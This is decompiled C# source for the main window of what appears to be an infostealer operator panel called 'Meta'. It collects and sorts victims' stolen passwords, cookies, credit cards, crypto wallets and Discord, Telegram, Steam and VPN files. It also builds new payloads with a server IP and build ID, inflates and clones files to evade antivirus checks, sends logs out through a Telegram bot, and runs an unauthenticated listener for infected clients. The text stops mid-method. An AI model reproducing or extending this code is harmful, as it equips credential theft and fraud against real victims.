using GuiLib;
using Meta.MainPanel.Data;
using Meta.MainPanel.Data.Controllers;
using Meta.MainPanel.Data.Extensions;
using Meta.MainPanel.Data.Files;
using Meta.MainPanel.Data.Helpers;
using Meta.MainPanel.DbControllers;
using Meta.MainPanel.LogExt;
using Meta.MainPanel.Models;
using Meta.MainPanel.Models.BTC;
using Meta.MainPanel.Models.Shared;
using Meta.MainPanel.Properties;
using Meta.MainPanel.Views.Settings;
using Meta.SharedModels;
using MetroSet_UI.Controls;
using Microsoft.VisualBasic;
using Pluralsight.Crypto;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.ServiceModel;
using System.ServiceModel.Description;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Helpers;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.InputFiles;
using Telegram.Bot.Types.ReplyMarkups;

namespace Meta.MainPanel.Views.Old.Actions;

public class MainFrm : Form
{
    [CompilerGenerated]
    private sealed class _003C_003Ec__DisplayClass50_0
    {
        public FolderSelectDialog folderBrowser;

        public MainFrm _003C_003E4__this;
    }

    [CompilerGenerated]
    private sealed class _003C_003Ec__DisplayClass51_0
    {
        public string comment;

        public MainFrm _003C_003E4__this;
    }

    [CompilerGenerated]
    private sealed class _003C_003Ec__DisplayClass51_1
    {
        public int selectedItem;

        public _003C_003Ec__DisplayClass51_0 CS_0024_003C_003E8__locals1;

        internal bool method_0(UserLog x)
        {
            return x.ID == selectedItem;
        }
    }

    [CompilerGenerated]
    private sealed class _003C_003Ec__DisplayClass51_2
    {
        public UserLog userLog;

        public _003C_003Ec__DisplayClass51_1 CS_0024_003C_003E8__locals2;

        internal void method_0()
        {
            try
            {
                userLog = LazyLoader<UserLogsDb>.Instance.LoadBody(CS_0024_003C_003E8__locals2.selectedItem);
                userLog.Comment = CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.comment;
                LazyLoader<UserLogsDb>.Instance.Save(userLog);
            }
            catch (Exception ex)
            {
                MessageBox.Show(CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1._003C_003E4__this, "Error item: " + ex.ToString());
            }
        }
    }

    [CompilerGenerated]
    private sealed class _003C_003Ec__DisplayClass95_0
    {
        public Update argument;

        internal bool method_0(TelegramChatSettings x)
        {
            if (x.ChatId == argument.Message.Chat.Id)
            {
                return x.BuildAccess;
            }
            return false;
        }
    }

    [CompilerGenerated]
    private sealed class _003C_003Ec__DisplayClass100_0
    {
        public UpdateEventArgs eventArgs;

        internal bool method_0(TelegramChatSettings x)
        {
            if (x.ChatId == eventArgs.Update.Message.Chat.Id)
            {
                return x.BuildAccess;
            }
            return false;
        }

        internal bool method_1(KeyValuePair<long, string> x)
        {
            return x.Key == eventArgs.Update.Message.Chat.Id;
        }
    }

    [CompilerGenerated]
    private sealed class _003C_003Ec__DisplayClass161_0
    {
        public string filePath;

        public FileInfo fileInfo;

        public MainFrm _003C_003E4__this;

        internal void method_0()
        {
            try
            {
                _003C_003Ec__DisplayClass161_1 CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass161_1
                {
                    CS_0024_003C_003E8__locals1 = this,
                    ofd = new OpenFileDialog()
                };
                try
                {
                    CS_0024_003C_003E8__locals0.ofd.Filter = "All files (*.*)|*.*";
                    CS_0024_003C_003E8__locals0.ofd.CheckPathExists = true;
                    CS_0024_003C_003E8__locals0.ofd.InitialDirectory = Directory.GetCurrentDirectory();
                    CS_0024_003C_003E8__locals0.ofd.RestoreDirectory = true;
                    CS_0024_003C_003E8__locals0.ofd.Multiselect = false;
                    _003C_003E4__this.Invoke((MethodInvoker)delegate
                    {
                        if (CS_0024_003C_003E8__locals0.ofd.ShowDialog(CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals1._003C_003E4__this) == DialogResult.OK)
                        {
                            CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals1.filePath = CS_0024_003C_003E8__locals0.ofd.FileName;
                        }
                    });
                }
                finally
                {
                    if (CS_0024_003C_003E8__locals0.ofd != null)
                    {
                        ((IDisposable)CS_0024_003C_003E8__locals0.ofd).Dispose();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(_003C_003E4__this, "Error: " + ex.Message);
            }
        }

        internal bool method_1(GuestFile x)
        {
            return x.Filename == fileInfo.Name;
        }
    }

    [CompilerGenerated]
    private sealed class _003C_003Ec__DisplayClass161_1
    {
        public OpenFileDialog ofd;

        public _003C_003Ec__DisplayClass161_0 CS_0024_003C_003E8__locals1;

        internal void method_0()
        {
            if (ofd.ShowDialog(CS_0024_003C_003E8__locals1._003C_003E4__this) == DialogResult.OK)
            {
                CS_0024_003C_003E8__locals1.filePath = ofd.FileName;
            }
        }
    }

    public static PanelSettings RemoteClientSettings = new PanelSettings();

    [CompilerGenerated]
    private object object_0 = "4.5.1";

    private IntPtr intptr_0;

    private object object_1 = new object();

    private static object object_2 = new Dictionary<string, Action<Update>>();

    private object object_3;

    private object object_4;

    private object object_5 = new BindingList<UserLog>();

    private object object_6 = string.Empty;

    private object object_7 = new object();

    private object m_a = new object();

    public static object settingsLock = new object();

    private object m_c = new object();

    private object d = new object();

    private object e;

    private object f = new Queue<string>();

    private object object_8 = new StatisticDb();

    private object object_9 = new List<MergeFile>();

    private static object object_10 = new Dictionary<long, string>();

    public static object BuildLocker = new object();

    private IntPtr intptr_1;

    private object object_11;

    private object panel1;

    private object dashboardTabs;

    private object notificationTab;

    private object statisticTab;

    private object logsTab;

    private object settingsTab;

    private object builderTab;

    private object topHeader;

    private object closeBtn;

    private object mainTitle;

    private object object_12;

    private object logsListView;

    private object notificationTb;

    private object logContextMenu;

    private object viewersToolStripMenuItem;

    private object passwordsToolStripMenuItem;

    private object cookiesToolStripMenuItem;

    private object autofillsToolStripMenuItem;

    private object creditCardsToolStripMenuItem;

    private object sorterTab;

    private object saveToolStripMenuItem;

    private object label1;

    private object commentTb;

    private object clearBtn;

    private object saveBtn;

    private object setCommentBtn;

    private object systemInfoToolStripMenuItem;

    private object metroSetDivider1;

    private object passwordsCounter;

    private object ftpLbl;

    private object ftpsCounter;

    private object metroSetDivider6;

    private object filesLbl;

    private object filesCounter;

    private object metroSetDivider5;

    private object cardsLbl;

    private object creditcardsCounter;

    private object metroSetDivider4;

    private object autofillsLbl;

    private object autofillsCounter;

    private object metroSetDivider3;

    private object cookiesLbl;

    private object cookiesCounter;

    private object metroSetDivider2;

    private object passwordsLbl;

    private object metroSetDivider7;

    private object metroSetDivider8;

    private object top10osLb;

    private object top10osLbl;

    private object top10CountriesLb;

    private object top10countryLbl;

    private object object_13;

    private object grabBrowsersLbl;

    private object grabBrowsersCb;

    private object grabFtpsLbl;

    private object grabFtpsCb;

    private object grabImClientsLbl;

    private object grabImClientsCb;

    private object grabFilesLbl;

    private object grabFilesCb;

    private object getFilesSettingsLbl;

    private object getFilesSettingsLb;

    private object addSearchPatternBtn;

    private object searchPatternTb;

    private object searchPatternLbl;

    private object saveSettingsBtn;

    private object metroSetDivider10;

    private object blackListCms_2;

    private object deleteToolStripMenuItem;

    private object blackListCms_3;

    private object toolStripMenuItem1;

    private object duplicateLbl;

    private object duplicateCb;

    private object fTPToolStripMenuItem;

    private object filesToolStripMenuItem;

    private object singleStatusLbl;

    private object metroSetLabel1;

    private object label11;

    private object singleCommentSortTb;

    private object label10;

    private object singleIdSortTb;

    private object label9;

    private object label8;

    private object singleCountrySortTb;

    private object singleSort;

    private object singleCookieSortTb;

    private object label12;

    private object metroSetDivider12;

    private object singlePasswordSortTb;

    private object singleFilesSortCb;

    private object label16;

    private object singleFtpsSortCb;

    private object label15;

    private object singleAfSortCb;

    private object label14;

    private object singleCCsSortCb;

    private object label13;

    private object singleOsSortTb;

    private object label17;

    private object sortDomain;

    private object domainsTb;

    private object domainSorterLbl;

    private object metroSetLabel3;

    private object currentDomainLbl;

    private object metroSetLabel2;

    private object buildIdTb;

    private object label20;

    private object serverIpTb;

    private object label19;

    private object createBuildBtn;

    private object openIconBtn;

    private object iconPath;

    private object label18;

    private object minimizeBtn;

    private object coldWalletLbl;

    private object coldWalletCounter;

    private object singleColdWalletSortCb;

    private object label3;

    private object grabColdWalletLbl;

    private object grabColdWalletCb;

    private object deleteToolStripMenuItem1;

    private object searchBtn;

    private object searchTb;

    private object label4;

    private object resetStatsBtn;

    private object userAgentLbl;

    private object blockEmptyLogsCb;

    private object object_14;

    private object object_15;

    private object pathsImportBtn;

    private object domainDetectorImportBtn;

    private object addDomainPatternBtn;

    private object domainDetectorTb;

    private object label5;

    private object blackListCms_1;

    private object toolStripMenuItem2;

    private object label6;

    private object runtimeExceptionToolStripMenuItem;

    private object m_a0;

    private object m_a1;

    private object m_a2;

    private object m_a3;

    private object m_a4;

    private object m_a5;

    private object m_a6;

    private object m_a7;

    private object m_a8;

    private object m_a9;

    private object m_aa;

    private object m_ab;

    private object m_ac;

    private object m_ad;

    private object m_ae;

    private object m_af;

    private object m_b0;

    private object m_b1;

    private object m_b2;

    private object m_b3;

    private object m_b4;

    private object m_b5;

    private object m_b6;

    private object b7;

    private object b8;

    private object b9;

    private object ba;

    private object bb;

    private object bc;

    private object bd;

    private object be;

    private object bf;

    private object c0;

    private object c1;

    private object c2;

    private object c3;

    private object c4;

    private object c5;

    private object c6;

    private object c7;

    private object c8;

    private object c9;

    private object ca;

    private object cb;

    private object cc;

    private object cd;

    private object ce;

    private object cf;

    private object d0;

    private object d1;

    private object d2;

    private object d3;

    private object d4;

    private object d5;

    private object d6;

    private object d7;

    private object d8;

    private object d9;

    private object da;

    private object db;

    private object dc;

    private object dd;

    private object de;

    private object df;

    private object e0;

    private object e1;

    private object e2;

    private object e3;

    private object e4;

    private object e5;

    private object e6;

    private object e7;

    private object e8;

    private object e9;

    private object ea;

    private object eb;

    private object ec;

    private object ed;

    private object ee;

    private object ef;

    private object f0;

    private object f1;

    private object f2;

    private object f3;

    private object f4;

    private object f5;

    private object f6;

    private object f7;

    private object f8;

    private object f9;

    private object fa;

    private object fb;

    private object fc;

    private object fd;

    private object fe;

    private object ff;

    private object importIPs;

    private object addBlackIPBtn;

    private object blackIPTb;

    private object label23;

    private object blackListIPsLb;

    private object label24;

    private object addBlackCountryBtn;

    private object blackCountryTb;

    private object blackCountryLbl;

    private object blackListLb;

    private object blackListLbl;

    private object blockHwidtoolStripMenuItem8;

    private object blackListCms_6;

    private object toolStripMenuItem8;

    private object label45;

    private object discordCb;

    private object errorMessageTb;

    private object label46;

    private object totalSelectedLogs;

    private object label50;

    private object object_16;

    private object iDDataGridViewTextBoxColumn;

    private object hWIDDataGridViewTextBoxColumn;

    private object iPDataGridViewTextBoxColumn;

    private object buildIDDataGridViewTextBoxColumn;

    private object usernameDataGridViewTextBoxColumn;

    private object isProcessElevatedDataGridViewCheckBoxColumn;

    private object currentLanguageDataGridViewTextBoxColumn;

    private object monitorSizeDataGridViewTextBoxColumn;

    private object logDateDataGridViewTextBoxColumn;

    private object object_17;

    private object countryDataGridViewTextBoxColumn;

    private object SeenBefore;

    private object Checked;

    private object locationDataGridViewTextBoxColumn;

    private object timeZoneDataGridViewTextBoxColumn;

    private object screenshotDataGridViewImageColumn;

    private object Comment;

    private object Creds;

    private object pDDDataGridViewTextBoxColumn;

    private object cDDDataGridViewTextBoxColumn;

    private object Credentials;

    private object configRecipientIdBtn;

    private object removeRecipientIdBtn;

    private object recipientsIdsListBox;

    private object label51;

    private object saveDiscordTokensBtn;

    private object addRecipientIdBtn;

    private object addIdBlackListBtn;

    private object removeIdBlackListBtn;

    private object blackListChatIds;

    private object label49;

    private object importCountries;

    private object importBuilds;

    private object addBlackBuildBtn;

    private object blackBuildIdTb;

    private object label52;

    private object blackListBuildsLb;

    private object blackListCms_7;

    private object toolStripMenuItem9;

    private object label53;

    private object cookiesMoreThan;

    private object label54;

    private object passMoreThan;

    private object label55;

    private object metroSetDivider20;

    private object activeConnections;

    private object label56;

    private object partnersTab;

    private object partnerPoster6;

    private object partnerPoster5;

    private object partnerPoster4;

    private object partnerPoster3;

    private object partnerPoster2;

    private object partnerPoster1;

    private object autoStartTelegramCb;

    private object label57;

    private object metroSetButton4;

    private object label59;

    private object showCreatorKeyBtn;

    private object label7;

    private object privateCreatorKeyTb;

    private object addNewBrowserExtBtn;

    private object newBrowserExtTb;

    private object label29;

    private object browsersExtensionsListBox;

    private object label30;

    private object blackListCms_8;

    private object toolStripMenuItem10;

    private object toolStripMenuItem11;

    private object resetDefaultSettingBtn;

    private object logHeaderTab;

    private object label2;

    private object saveLogHeaderBtn;

    private object logsHeaderTb;

    private object miscTab;

    private object virusTotalTextbox;

    private object metroSetButton3;

    private object virusTotalKey;

    private object label47;

    private object openVirusTotalFile;

    private object virustotalFile;

    private object label48;

    private object metroSetDivider19;

    private object pumpBtn;

    private object bytesCount;

    private object bytesCountLbl;

    private object openPumpBtn;

    private object pumpPath;

    private object pumpPathLbl;

    private object cloneBtn;

    private object certificate;

    private object certificateLbl;

    private object assemblyInfo;

    private object assemblyInfoLbl;

    private object metroSetDivider13;

    private object openBuildBtn;

    private object buildPathTb;

    private object buildPathLbl;

    private object openTargetBtn;

    private object targetPathTb;

    private object targetPathLbl;

    private object mergerTab;

    private object metroSetButton1;

    private object mergeBtn;

    private object metroSetButton6;

    private object fileToMergeLb;

    private object label25;

    private object scannerTab;

    private object label33;

    private object fileScanBtn;

    private object scanResults;

    private object refresherLbl;

    private object autoRefreshCb;

    private object refresherTab;

    private object label34;

    private object freshCookiesTb;

    private object refreshCookiesBtn;

    private object accessTokenTb;

    private object refreshCookiesLbl;

    private object reloadBtn;

    private object guestLinkTab;

    private object changeMd5Cb;

    private object label36;

    private object createDirectFileBtn;

    private object guestFilesDgv;

    private object metroSetDivider16;

    private object guestExpireDate;

    private object label58;

    private object guestBuildID;

    private object label60;

    private object addGuest;

    private object guestLinksDgv;

    private object iDDataGridViewTextBoxColumn1;

    private object filenameDataGridViewTextBoxColumn;

    private object changeMd5DataGridViewCheckBoxColumn;

    private object object_18;

    private object iDDataGridViewTextBoxColumn2;

    private object buildIDDataGridViewTextBoxColumn1;

    private object expiresTimeDataGridViewTextBoxColumn;

    private object object_19;

    private object loadConfigBtn;

    private object saveConfigBtn;

    private object label61;

    private object autoUpdatePanelCb;

    private object buildType;

    public string Version
    {
        [CompilerGenerated]
        get
        {
            return (string)object_0;
        }
        [CompilerGenerated]
        set
        {
            object_0 = value;
        }
    }

    public MainFrm()
    {
        InitializeComponent();
        InitCommands();
        this.AllowDraggBy((Control)topHeader);
        _ = ((Control)logsListView).Handle;
        _ = base.Handle;
        Login();
        RemoteClientSettings.LoadSettings();
        a(logsListView, 1u);
        MetaEvents.OnVerify = (OnVerifyConnectionRequested)Delegate.Combine(MetaEvents.OnVerify, (OnVerifyConnectionRequested)((string header, string buildId) => true));
        ProfileSettings.OnCreatorStateChanged = (EventHandler<bool>)Delegate.Combine(ProfileSettings.OnCreatorStateChanged, b: (EventHandler<bool>)delegate (object a, uint b)
        {
            if (b != 0)
            {
                ((AnimaTextBox)privateCreatorKeyTb).Text = "*********";
            }
            else
            {
                ((AnimaTextBox)privateCreatorKeyTb).Text = "NOT AVAILABLE";
            }
        });
        if (ProfileSettings.CreatorActivated)
        {
            ((AnimaTextBox)privateCreatorKeyTb).Text = "*********";
        }
        else
        {
            ((AnimaTextBox)privateCreatorKeyTb).Text = "NOT AVAILABLE";
        }
        PageController<UserLog> pageController = LazyLoader<UserLogsDb>.Instance.PageController;
        pageController.OnPageChanged = (ChangePageEventHandler)Delegate.Combine(pageController.OnPageChanged, (ChangePageEventHandler)delegate (uint page)
        {
            int page = (int)page;
            if (page >= 0 && page < LazyLoader<UserLogsDb>.Instance.PageController.PagesCount)
            {
                Invoke((MethodInvoker)delegate
                {
                    ((Control)db).Text = (page + 1).ToString();
                    ((DataGridView)logsListView).DataSource = LazyLoader<UserLogsDb>.Instance.PageController.Pages[page];
                });
            }
        });
        System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
        timer.Interval = 5000;
        timer.Enabled = true;
        timer.Tick += delegate
        {
            ProcessNotifies();
        };
        timer.Start();
        System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
        timer2.Interval = 1000;
        timer2.Enabled = true;
        timer2.Tick += delegate
        {
            lock (MetaEvents.Counter)
            {
                ((Control)activeConnections).Text = MetaEvents.Counter.ToString();
                MetaEvents.Counter = 0;
            }
        };
        timer2.Start();
        PageController<UserLog> pageController2 = LazyLoader<UserLogsDb>.Instance.PageController;
        pageController2.OnCountChanged = (ItemsCountChangedEventHandler)Delegate.Combine(pageController2.OnCountChanged, (ItemsCountChangedEventHandler)delegate (uint count)
        {
            int count = (int)count;
            try
            {
                if (count < LazyLoader<UserLogsDb>.Instance.PageController.PageSize)
                {
                    LazyLoader<UserLogsDb>.Instance.PageController.PagesCount = 1;
                }
                else
                {
                    LazyLoader<UserLogsDb>.Instance.PageController.PagesCount = count / LazyLoader<UserLogsDb>.Instance.PageController.PageSize + 1;
                }
                lock (object_1)
                {
                    if (base.InvokeRequired)
                    {
                        Invoke((MethodInvoker)delegate
                        {
                            ((Control)df).Text = count.ToString();
                            ((Control)dd).Text = LazyLoader<UserLogsDb>.Instance.PageController.PagesCount.ToString();
                        });
                    }
                    else
                    {
                        ((Control)df).Text = count.ToString();
                        ((Control)dd).Text = LazyLoader<UserLogsDb>.Instance.PageController.PagesCount.ToString();
                    }
                }
            }
            catch
            {
            }
        });
        object[] items2;
        try
        {
            ListBox.ObjectCollection items = ((ListBox)blackListChatIds).Items;
            items2 = System.IO.File.ReadAllLines("blackListChats.ini");
            items.AddRange(items2);
        }
        catch
        {
        }
        ((StatisticDb)object_8).LoadSettings();
        e = new TelegramChatsDb();
        ((TelegramChatsDb)e).LoadSettings();
        object obj2 = e;
        List<TelegramChatSettings> chatsSettings = ((TelegramChatsDb)e).chatsSettings;
        object obj3;
        if (chatsSettings == null)
        {
            obj3 = null;
        }
        else
        {
            IEnumerable<TelegramChatSettings> enumerable = chatsSettings.Take(CountOfChats());
            if (enumerable == null)
            {
                obj3 = null;
            }
            else
            {
                obj3 = enumerable.ToList();
                if (obj3 != null)
                {
                    goto IL_027c;
                }
            }
        }
        obj3 = new List<TelegramChatSettings>();
        goto IL_027c;
    IL_02dc:
        object obj4;
        items2 = (object[])obj4;
        object items3;
        ((ListBox.ObjectCollection)items3).AddRange(items2);
        object_3 = new ServiceSettings();
        ((ServiceSettings)object_3).LoadSettings();
        LoadSettings();
        if (RemoteClientSettings.AutoStart && !string.IsNullOrWhiteSpace(RemoteClientSettings.TelegramBotToken))
        {
            method_8();
        }
        UpdateStat();
        Uri uriHttps = new Uri(string.Format("net.tcp://{0}:{1}", "0.0.0.0", ((ServiceSettings)object_3).Port));
        NetTcpBinding binding = new NetTcpBinding
        {
            MaxReceivedMessageSize = 2147483647L,
            MaxBufferPoolSize = 2147483647L,
            CloseTimeout = TimeSpan.FromMinutes(30.0),
            OpenTimeout = TimeSpan.FromMinutes(30.0),
            ReceiveTimeout = TimeSpan.FromMinutes(30.0),
            SendTimeout = TimeSpan.FromMinutes(30.0),
            TransferMode = TransferMode.Buffered,
            ReaderQuotas = new XmlDictionaryReaderQuotas
            {
                MaxDepth = 44567654,
                MaxArrayLength = int.MaxValue,
                MaxBytesPerRead = int.MaxValue,
                MaxNameTableCharCount = int.MaxValue,
                MaxStringContentLength = int.MaxValue
            },
            Security = new NetTcpSecurity
            {
                Mode = SecurityMode.None,
                Message = new MessageSecurityOverTcp
                {
                    ClientCredentialType = MessageCredentialType.None
                }
            }
        };
        MetaEvents.Domain = ((ServiceSettings)object_3).Port == 80 || ((ServiceSettings)object_3).Port == 81;
        MetaEvents.OnNewClientRecieved = (NewClientHandler)Delegate.Combine(MetaEvents.OnNewClientRecieved, new NewClientHandler(ReciveClient));
        MetaEvents.OnGetSettings = (SettingsHandler)Delegate.Combine(MetaEvents.OnGetSettings, new SettingsHandler(OnGetSettings));
        ((AnimaTextBox)serverIpTb).Text = SettingsOfPanel.Default.ServerIP;
        Task.Run((Func<Task>)delegate
        {
            /*Error: Method body consists only of 'ret', but nothing is being returned. Decompiled assembly might be a reference assembly.*/
            ;
        });
        Func<Task> value = delegate
                {
                    /*Error: Method body consists only of 'ret', but nothing is being returned. Decompiled assembly might be a reference assembly.*/
                    ;
                };
        Task.Run((Func<Task>)value);
        Task.Run((Func<Task>)delegate
        {
            while (true)
            {
                try
                {
                    lock (this.m_a)
                    {
                        ((StatisticDb)object_8).SaveSettings();
                    }
                }
                catch (Exception)
                {
                }
                Task.Delay(TimeSpan.FromSeconds(30.0)).Wait();
            }
        });
        ((DateTimePicker)d5).CustomFormat = "dd.MM.yyyy HH:mm";
        ((DateTimePicker)d6).CustomFormat = "dd.MM.yyyy HH:mm";
        ((DateTimePicker)d5).Value = new DateTime(2000, 1, 1);
        ((DateTimePicker)d6).Value = new DateTime(2030, 1, 1);
        ((Control)df).Text = LazyLoader<UserLogsDb>.Instance.DbInstance.Count.ToString();
        if (LazyLoader<UserLogsDb>.Instance.DbInstance.Count < LazyLoader<UserLogsDb>.Instance.PageController.PageSize)
        {
            LazyLoader<UserLogsDb>.Instance.PageController.PagesCount = 1;
        }
        else
        {
            LazyLoader<UserLogsDb>.Instance.PageController.PagesCount = LazyLoader<UserLogsDb>.Instance.DbInstance.Count / LazyLoader<UserLogsDb>.Instance.PageController.PageSize + 1;
        }
        ((Control)dd).Text = LazyLoader<UserLogsDb>.Instance.PageController.PagesCount.ToString();
        LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = 0;
        method_0();
        Task.Run(delegate
        {
            bool flag = true;
            Task.Delay(TimeSpan.FromSeconds(5.0)).Wait();
            while (true)
            {
                try
                {
                    if (flag)
                    {
                        AddNotify("Server is starting");
                    }
                    ServiceHost serviceHost = new ServiceHost(typeof(MetaService), uriHttps);
                    serviceHost.AddServiceEndpoint(typeof(IRemoteEndpoint), binding, "");
                    ServiceDebugBehavior serviceDebugBehavior = serviceHost.Description.Behaviors.Find<ServiceDebugBehavior>();
                    if (serviceDebugBehavior != null)
                    {
                        serviceDebugBehavior.HttpHelpPageEnabled = false;
                        serviceDebugBehavior.HttpsHelpPageEnabled = false;
                        serviceDebugBehavior.IncludeExceptionDetailInFaults = true;
                    }
                    else
                    {
                        serviceHost.Description.Behaviors.Add(new ServiceDebugBehavior
                        {
                            HttpHelpPageEnabled = false,
                            HttpsHelpPageEnabled = false,
                            IncludeExceptionDetailInFaults = true
                        });
                    }
                    ServiceThrottlingBehavior serviceThrottlingBehavior = serviceHost.Description.Behaviors.Find<ServiceThrottlingBehavior>();
                    if (serviceThrottlingBehavior != null)
                    {
                        serviceThrottlingBehavior.MaxConcurrentCalls = int.MaxValue;
                        serviceThrottlingBehavior.MaxConcurrentInstances = int.MaxValue;
                        serviceThrottlingBehavior.MaxConcurrentSessions = int.MaxValue;
                    }
                    else
                    {
                        serviceHost.Description.Behaviors.Add(new ServiceThrottlingBehavior
                        {
                            MaxConcurrentCalls = int.MaxValue,
                            MaxConcurrentInstances = int.MaxValue,
                            MaxConcurrentSessions = int.MaxValue
                        });
                    }
                    serviceHost.Open();
                    if (flag)
                    {
                        AddNotify("Server is running on " + ((ServiceSettings)object_3).Port);
                        flag = false;
                    }
                    Task.Delay(TimeSpan.FromMinutes(30.0)).Wait();
                    if (serviceHost.State != CommunicationState.Faulted)
                    {
                        serviceHost.Close();
                        using (serviceHost)
                        {
                        }
                    }
                    else
                    {
                        serviceHost.Abort();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(this, "Unable to start server, error: " + ex);
                    AddNotify($"Server error: {ex}");
                    Task.Delay(TimeSpan.FromMinutes(1.0)).Wait();
                }
            }
        });
        ((DataGridView)guestLinksDgv).DataSource = LazyLoader<GuestLinksDb>.Instance.DbInstance;
        ((DataGridView)guestFilesDgv).DataSource = LazyLoader<GuestFilesDb>.Instance.DbInstance;
        Task.Run(delegate
        {
            try
            {
                GuestHttpServer guestHttpServer = new GuestHttpServer(20);
                AddNotify("GuestHttpServer is starting");
                guestHttpServer.ProcessRequest += c;
                guestHttpServer.Start("+", ((ServiceSettings)object_3).GuestPort);
                AddNotify("GuestHttpServer is running");
            }
            catch (Exception arg)
            {
                AddNotify($"GuestHttpServer error: {arg}");
            }
        });
        Task.Run((Func<Task>)delegate
        {
            while (true)
            {
                try
                {
                    CheckUpdates();
                }
                catch
                {
                }
                Thread.Sleep(TimeSpan.FromMinutes(10.0));
            }
        });
        base.Size = new Size(1366, 674);
        return;
    IL_027c:
        ((TelegramChatsDb)obj2).chatsSettings = (List<TelegramChatSettings>)obj3;
        ((TelegramChatsDb)e).SaveSettings();
        items3 = ((ListBox)recipientsIdsListBox).Items;
        IEnumerable<string> enumerable2 = ((TelegramChatsDb)e).chatsSettings.Select((TelegramChatSettings x) => x.ChatId.ToString());
        if (enumerable2 == null)
        {
            obj4 = null;
        }
        else
        {
            obj4 = enumerable2.ToArray();
            if (obj4 != null)
            {
                goto IL_02dc;
            }
        }
        obj4 = new string[0];
        goto IL_02dc;
    }

    public void CheckUpdates()
    {
        try
        {
            string text = Environment.ExpandEnvironmentVariables("%tmp%\\MetaUpdate");
            if (Directory.Exists(text))
            {
                Directory.Delete(text, recursive: true);
            }
            UpdateRoot updateRoot = (UpdateRoot)smethod_0();
            if (updateRoot == null)
            {
                return;
            }
            Version version = new Version(Version);
            Version version2 = new Version(updateRoot.version);
            if ((!updateRoot.forceUpdate && !RemoteClientSettings.AutoUpdate && version2 > version && MessageBox.Show(this, "Do you want to install new version of panel?\nNew version is " + updateRoot.version + "\nCurrent version is " + Version, "Updater", MessageBoxButtons.YesNo) == DialogResult.No) || !(version2 > version))
            {
                return;
            }
            if (Directory.Exists(text))
            {
                Directory.Delete(text, recursive: true);
            }
            Directory.CreateDirectory(text);
            System.IO.File.WriteAllBytes(Path.Combine(text, "Meta.Updater.exe"), Resources.Meta_Updater);
            foreach (UpdateFile file in updateRoot.files)
            {
                string text2 = Path.Combine(text, "Files");
                if (!Directory.Exists(text2))
                {
                    Directory.CreateDirectory(text2);
                }
                if (!string.IsNullOrWhiteSpace(file.directory))
                {
                    string path = Path.Combine(text2, file.directory);
                    if (!Directory.Exists(path))
                    {
                        Directory.CreateDirectory(path);
                    }
                }
                using WebClient webClient = new WebClient();
                System.IO.File.WriteAllBytes(Path.Combine(text2 + (string.IsNullOrWhiteSpace(file.directory) ? string.Empty : ("\\" + file.directory)), file.link.Split('/').Last()), webClient.DownloadData(file.link));
            }
            string text3 = DPAPI.Protect(ProfileSettings.Login, DataProtectionScope.CurrentUser, "0x31242");
            string text4 = DPAPI.Protect(ProfileSettings.Password, DataProtectionScope.CurrentUser, "0x31242");
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = Path.Combine(text, "Meta.Updater.exe");
            processStartInfo.Arguments = "\"" + Directory.GetCurrentDirectory() + "\" \"auth\" \"" + text3 + "\" \"" + text4 + "\"";
            processStartInfo.WorkingDirectory = text;
            processStartInfo.CreateNoWindow = true;
            processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            processStartInfo.UseShellExecute = false;
            Process.Start(processStartInfo);
            Environment.Exit(322);
        }
        catch
        {
        }
    }

    private static object smethod_0()
    {
        return null;
    }

    private object method_0()
    {
        SelfSignedCertProperties properties = new SelfSignedCertProperties
        {
            Name = new X500DistinguishedName("CN=localhost"),
            ValidFrom = DateTime.Now.AddDays(-7.0),
            ValidTo = DateTime.Now.AddYears(5),
            KeyBitLength = 512,
            IsPrivateKeyExportable = true
        };
        using CryptContext cryptContext = new CryptContext();
        cryptContext.Open();
        return cryptContext.CreateSelfSignedCertificate(properties);
    }

    public int CountOfChats()
    {
        return ProfileSettings.Login switch
        {
            "olipmik" => 10,
            "FHEKF893fh824fh" => 11,
            "qz740" => 10,
            _ => 5,
        };
    }

    private uint method_1(UserLog userLog)
    {
        try
        {
            if (userLog.Credentials.Files != null && smethod_1(userLog.Credentials.Files) != 0)
            {
                return 1u;
            }
            if (userLog.Credentials.Discord != null && smethod_1(userLog.Credentials.Discord) != 0)
            {
                return 1u;
            }
            if (userLog.Credentials.TelegramFiles != null && smethod_1(userLog.Credentials.TelegramFiles) != 0)
            {
                return 1u;
            }
            if (userLog.Credentials.ProtonVPN != null && smethod_1(userLog.Credentials.ProtonVPN) != 0)
            {
                return 1u;
            }
            if (userLog.Credentials.OpenVPN != null && smethod_1(userLog.Credentials.OpenVPN) != 0)
            {
                return 1u;
            }
            if (userLog.Credentials.ColdWallets == null || smethod_1(userLog.Credentials.ColdWallets) == 0)
            {
                if (userLog.Credentials.SteamFiles != null && smethod_1(userLog.Credentials.SteamFiles) != 0)
                {
                    return 1u;
                }
                return 0u;
            }
            return 1u;
        }
        catch
        {
            return 0u;
        }
    }

    private static uint smethod_1(object currentRemoteFiles)
    {
        try
        {
            foreach (RemoteFile item in (IEnumerable<RemoteFile>)currentRemoteFiles)
            {
                try
                {
                    if (smethod_2(item.FileDirectory) == 0 && smethod_2(item.FileName) == 0 && smethod_2(item.SourcePath) == 0)
                    {
                        continue;
                    }
                    return 1u;
                }
                catch
                {
                }
            }
            return 0u;
        }
        catch
        {
            return 0u;
        }
    }

    private static uint smethod_2(object exp)
    {
